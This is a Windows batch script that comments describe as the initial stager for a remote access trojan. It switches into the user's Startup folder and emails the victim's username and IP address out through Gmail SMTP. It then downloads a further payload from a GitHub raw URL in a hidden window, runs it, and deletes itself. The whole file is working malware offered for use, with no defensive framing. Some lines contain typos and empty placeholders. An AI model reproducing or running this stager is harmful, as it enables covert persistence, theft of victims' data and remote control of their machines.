@echo off
@REM initial stager for rat

@REM credentials - change me
set email = "example@gmail.com"
set password = "password"

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup dir
cd %STARTUP%

@REM setup smtpp
powershell Send-MailMessage -From %% -To %% -Subject "%env:Username" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer smtp.gmail.com -Port 587 -UseSSl -Credential (New-Object -TypeNAame System.Management.Automation.PSCredential -ArgumentList %%, (ConvertTo-SecureString -String %% -AsPlainText -Force))
@REM -Attachment "./initial.cmd"


@REM write payloads to startup

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd

@REM cd back into initial location
cd "%INITIALPATH%"

@REM self delete
del initial.cmd
